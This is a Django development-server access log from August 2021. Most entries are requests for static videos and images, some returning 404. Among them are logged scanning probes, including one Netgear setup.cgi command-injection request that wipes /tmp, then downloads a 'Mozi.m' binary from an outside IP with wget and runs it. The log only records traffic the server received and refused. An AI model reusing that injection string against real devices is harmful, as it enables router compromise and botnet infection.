Watching for file changes with StatReloader
Not Found: /
[08/Aug/2021 16:22:33] "GET / HTTP/1.1" 404 2197
Not Found: /
[08/Aug/2021 16:22:48] "GET / HTTP/1.1" 404 2197
[08/Aug/2021 16:23:39] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 77824
[08/Aug/2021 16:23:42] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
Not Found: /favicon.ico
[08/Aug/2021 16:23:42] "GET /favicon.ico HTTP/1.1" 404 2248
Not Found: /
[08/Aug/2021 16:47:40] "GET / HTTP/1.0" 404 2238
Not Found: /
[08/Aug/2021 17:19:37] "GET / HTTP/1.1" 404 2197
Not Found: /
[08/Aug/2021 18:05:26] "GET / HTTP/1.1" 404 2197
Not Found: /
[08/Aug/2021 19:42:10] "GET / HTTP/1.1" 404 2238
Not Found: /config/getuser
[08/Aug/2021 21:03:18] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
Not Found: /
[08/Aug/2021 21:09:13] "GET / HTTP/1.0" 404 2197
[08/Aug/2021 21:09:13,883] - Broken pipe from ('42.190.144.87', 7758)

Not Found: /manager/text/list
[08/Aug/2021 21:55:55] "GET /manager/text/list HTTP/1.1" 404 2266
Not Found: /http:/104.149.194.78:80/
[09/Aug/2021 00:11:09] "GET http://104.149.194.78:80/ HTTP/1.1" 404 1819
Not Found: /setup.cgi
[09/Aug/2021 01:58:41] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.85.209.42:47314/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2448
Not Found: /file/InShot_20210806_115808609.jpg
[09/Aug/2021 02:36:52] "GET /file/InShot_20210806_115808609.jpg HTTP/1.1" 404 2317
Not Found: /favicon.ico
[09/Aug/2021 02:36:53] "GET /favicon.ico HTTP/1.1" 404 2248
Not Found: /file/
[09/Aug/2021 02:37:11] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:38:23] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:16] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:18] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:18] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:19] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:19] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:19] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:20] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:20] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:20] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:20] "GET /file/ HTTP/1.1" 404 2230
Not Found: /file/
[09/Aug/2021 02:40:20] "GET /file/ HTTP/1.1" 404 2230
[09/Aug/2021 03:24:47] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 304 0
[09/Aug/2021 03:27:09] "GET /static HTTP/1.1" 301 0
[09/Aug/2021 03:27:22] "GET /static/ HTTP/1.1" 404 1884
[09/Aug/2021 03:27:27] "GET /static/ HTTP/1.1" 404 1884
[09/Aug/2021 03:29:49] "GET /static/[BE%20ORIGINAL]%20TWICE(____)%20_I%20CAN_T%20STOP%20ME_%20(4K)(1080P_60FPS).mp4 HTTP/1.1" 200 77824
[09/Aug/2021 03:30:04] "GET /static/[BE%20ORIGINAL]%20TWICE(____)%20_I%20CAN_T%20STOP%20ME_%20(4K)(1080P_60FPS).mp4 HTTP/1.1" 200 45375488
[09/Aug/2021 03:30:51] "GET /static/[BE HTTP/1.1" 404 1887
[09/Aug/2021 03:31:30] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 77824
[09/Aug/2021 03:31:36] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:33:03] "GET /static/mmexport1628064261150.jpg HTTP/1.1" 200 20955
[09/Aug/2021 03:33:03] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).jpg HTTP/1.1" 200 76924
[09/Aug/2021 03:33:03] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:33:04] "GET /static/InShot_20210806_115738034.jpg HTTP/1.1" 200 57891
[09/Aug/2021 03:33:04] "GET /static/InShot_20210806_115808609.jpg HTTP/1.1" 200 67309
[09/Aug/2021 03:33:04] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 73728
[09/Aug/2021 03:33:04] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:33:05] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 221184
[09/Aug/2021 03:33:06] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 831488
[09/Aug/2021 03:33:07] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 241664
[09/Aug/2021 03:33:08] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 884736
[09/Aug/2021 03:33:08] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 167936
[09/Aug/2021 03:33:09] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 1728512
[09/Aug/2021 03:33:11] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:33:13] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:33:14] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 1724416
[09/Aug/2021 03:33:19] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:33:21] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:33:22] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 2162688
[09/Aug/2021 03:33:26] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:33:28] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 8223910
[09/Aug/2021 03:33:29] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 2633728
[09/Aug/2021 03:33:29] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 487424
[09/Aug/2021 03:33:30] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 135168
[09/Aug/2021 03:33:30] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 167936
[09/Aug/2021 03:33:30] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 135168
[09/Aug/2021 03:33:31] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 167936
[09/Aug/2021 03:33:34] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 167936
[09/Aug/2021 03:33:37] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 147456
[09/Aug/2021 03:33:38] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 77824
[09/Aug/2021 03:33:38] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 3948544
[09/Aug/2021 03:33:40] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 655360
[09/Aug/2021 03:33:43] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 143360
[09/Aug/2021 03:33:43] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 335872
[09/Aug/2021 03:33:43] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 303104
[09/Aug/2021 03:33:43] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 286720
[09/Aug/2021 03:33:45] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 516096
[09/Aug/2021 03:33:45] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 65536
[09/Aug/2021 03:33:45] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 200 618496
[09/Aug/2021 03:33:45] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 245760
[09/Aug/2021 03:33:45] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 147456
[09/Aug/2021 03:33:46] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 200 69632
[09/Aug/2021 03:38:16] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:16] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:16] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 258048
[09/Aug/2021 03:38:16] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 200 147456
[09/Aug/2021 03:38:16] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:16] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:18] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:18] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:20] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:20] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:32] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:32] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:32] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:32] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:32] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:38:33] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:38:34] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 753664
[09/Aug/2021 03:38:35] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115738034.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).jpg HTTP/1.1" 404 2143
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115808609.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/mmexport1628064261150.jpg HTTP/1.1" 200 20955
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115808609.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).jpg HTTP/1.1" 404 2143
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:01] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:01] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:01] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:02] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:02] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 1036288
[09/Aug/2021 03:39:02] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 684032
[09/Aug/2021 03:39:02] "GET /static/InShot_20210806_115738034.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:02] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:05] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:22] "GET /static/InShot_20210806_115808609.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:22] "GET /static/InShot_20210806_115738034.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:22] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).jpg HTTP/1.1" 404 2143
[09/Aug/2021 03:39:22] "GET /static/InShot_20210806_115738034.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:22] "GET /static/InShot_20210806_115808609.jpg HTTP/1.1" 404 1963
[09/Aug/2021 03:39:22] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).jpg HTTP/1.1" 404 2143
[09/Aug/2021 03:39:28] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:28] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:28] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:28] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:28] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:28] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:29] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:31] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:31] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:32] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:33] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 1742430
[09/Aug/2021 03:39:33] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 1742430
[09/Aug/2021 03:39:33] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 1742430
[09/Aug/2021 03:39:33] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:33] "GET /static/%EF%BC%88%E6%8A%96%E9%9F%B3%EF%BC%89%E7%88%B1%E8%B7%B3%E8%88%9E%E7%9A%84%E7%94%9C%E5%A6%9E%E4%B8%80%E6%A0%97%E5%B0%8F%E8%8E%8E%E5%AD%90(1080P_HD).mp4 HTTP/1.1" 404 2143
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:34] "GET /static/mmexport1628064261150.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:34] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:35] "GET /static/InShot_20210806_115738034.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:39:36] "GET /static/InShot_20210806_115808609.mp4 HTTP/1.1" 404 1963
[09/Aug/2021 03:42:12] "GET /static/a1.mp4 HTTP/1.1" 200 3817472
[09/Aug/2021 03:42:12] "GET /static/a2.jpg HTTP/1.1" 200 57891
[09/Aug/2021 03:42:12] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:42:12] "GET /static/a1.jpg HTTP/1.1" 200 76924
[09/Aug/2021 03:42:12] "GET /static/a3.jpg HTTP/1.1" 200 67309
[09/Aug/2021 03:42:12] "GET /static/a1.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:42:12] "GET /static/a2.mp4 HTTP/1.1" 200 2428928
[09/Aug/2021 03:42:12] "GET /static/a2.mp4 HTTP/1.1" 200 3846144
[09/Aug/2021 03:42:13] "GET /static/a1.mp4 HTTP/1.1" 200 901120
[09/Aug/2021 03:42:13] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:13] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:13] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:14] "GET /static/a4.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:42:15] "GET /static/a1.mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:42:15,593] - Broken pipe from ('10.59.212.188', 40160)

[09/Aug/2021 03:42:15] "GET /static/a4.mp4 HTTP/1.1" 200 2088960
[09/Aug/2021 03:42:15] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:42:15] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:42:16] "GET /static/a3.jpg HTTP/1.1" 200 67309
[09/Aug/2021 03:42:17] "GET /static/a1.mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:42:17] "GET /static/a1.mp4 HTTP/1.1" 200 5160960
[09/Aug/2021 03:42:19] "GET /static/a1.mp4 HTTP/1.1" 200 20008960
[09/Aug/2021 03:42:19] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:19] "GET /static/a2.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:42:19] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:19] "GET /static/a2.mp4 HTTP/1.1" 200 1884160
[09/Aug/2021 03:42:19] "GET /static/a2.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:42:19] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:20] "GET /static/a2.mp4 HTTP/1.1" 200 225280
[09/Aug/2021 03:42:23] "GET /static/a2.mp4 HTTP/1.1" 200 196608
[09/Aug/2021 03:42:24] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:24] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:25] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:27] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:28] "GET /static/a4.mp4 HTTP/1.1" 200 237568
[09/Aug/2021 03:42:28] "GET /static/a4.mp4 HTTP/1.1" 200 122880
[09/Aug/2021 03:42:29] "GET /static/a4.mp4 HTTP/1.1" 200 217088
[09/Aug/2021 03:42:30] "GET /static/a4.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:42:32] "GET /static/a4.mp4 HTTP/1.1" 200 454656
[09/Aug/2021 03:42:39] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:42:39] "GET /static/a1.jpg HTTP/1.1" 200 76924
[09/Aug/2021 03:42:40] "GET /static/a2.jpg HTTP/1.1" 200 57891
[09/Aug/2021 03:42:40] "GET /static/a3.jpg HTTP/1.1" 200 67309
[09/Aug/2021 03:42:40] "GET /static/a4.jpg HTTP/1.1" 404 1894
[09/Aug/2021 03:42:40] "GET /static/a1.mp4 HTTP/1.1" 200 864256
[09/Aug/2021 03:42:40] "GET /static/a1.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:42:40] "GET /static/a1.mp4 HTTP/1.1" 200 851968
[09/Aug/2021 03:42:40] "GET /static/a2.mp4 HTTP/1.1" 200 1253376
[09/Aug/2021 03:42:40] "GET /static/a2.mp4 HTTP/1.1" 200 2539520
[09/Aug/2021 03:42:40] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:41] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:41] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:42:42] "GET /static/a4.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:42:42] "GET /static/a1.mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:42:43] "GET /static/a4.mp4 HTTP/1.1" 200 1396736
[09/Aug/2021 03:42:44] "GET /static/a1.mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:42:45] "GET /static/a1.mp4 HTTP/1.1" 200 5742592
[09/Aug/2021 03:42:46] "GET /static/a1.mp4 HTTP/1.1" 200 20978890
[09/Aug/2021 03:43:05] "GET /static/a1.mp4 HTTP/1.1" 200 15446016
[09/Aug/2021 03:43:05] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:05] "GET /static/a2.mp4 HTTP/1.1" 200 229376
[09/Aug/2021 03:43:05] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:05] "GET /static/a2.mp4 HTTP/1.1" 200 974848
[09/Aug/2021 03:43:05] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:06] "GET /static/a2.mp4 HTTP/1.1" 200 57344
[09/Aug/2021 03:43:07] "GET /static/a2.mp4 HTTP/1.1" 200 61440
[09/Aug/2021 03:43:09] "GET /static/a2.mp4 HTTP/1.1" 200 221184
[09/Aug/2021 03:43:12] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:12] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:13] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:15] "GET /static/a3.mp4 HTTP/1.1" 404 1894
[09/Aug/2021 03:43:17] "GET /static/a4.mp4 HTTP/1.1" 200 114688
[09/Aug/2021 03:43:17] "GET /static/a4.mp4 HTTP/1.1" 200 8437920
[09/Aug/2021 03:43:18] "GET /static/a4.mp4 HTTP/1.1" 200 200704
